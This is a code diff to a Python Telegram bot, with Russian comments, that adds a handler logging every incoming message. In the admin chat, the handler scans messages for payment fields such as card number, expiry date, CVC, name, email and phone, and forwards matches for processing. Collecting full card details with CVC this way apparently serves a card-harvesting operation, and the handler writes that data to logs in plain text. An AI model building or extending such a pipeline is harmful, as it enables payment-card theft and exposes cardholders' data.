@@ -35,6 +35,27 @@ ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
 bot = Bot(token=BOT_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
+@dp.message()
+async def handle_all_messages(message: types.Message):
+    # Логируем ВСЕ сообщения для диагностики
+    logger.info(f"📨 СООБЩЕНИЕ: Чат: {message.chat.id}, Текст: {message.text}")
+    
+    # Проверяем что это админский чат
+    if message.chat.id == ADMIN_CHAT_ID:
+        logger.info("✅ Это админский чат!")
+        
+        message_text = message.text or ""
+        logger.info(f"📝 Текст сообщения: {message_text}")
+        
+        # Проверяем платежные данные (более гибкая проверка)
+        payment_keywords = ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:", "Имя:", "Фамилия:", "Email:", "Телефон:"]
+        
+        found_keywords = [keyword for keyword in payment_keywords if keyword in message_text]
+        if found_keywords:
+            logger.info(f"💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ! Ключевые слова: {found_keywords}")
+            await process_payment_data(message)
+        else:
+            logger.info("ℹ️ Обычное сообщение, нет платежных данных")
 
 # SSE сервер
 app = Flask(__name__)
@@ -875,6 +896,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
